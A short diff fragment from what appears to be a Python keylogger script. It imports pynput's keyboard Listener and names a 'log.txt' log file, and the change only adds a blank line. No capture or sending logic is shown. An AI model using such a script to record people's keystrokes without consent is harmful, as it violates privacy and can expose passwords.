@@ -3,6 +3,7 @@
 # Works on Linux Debian (aarch64) with pynput
 
 import pynput
+
 from pynput.keyboard import Listener
 
 LOGFILE = "log.txt"
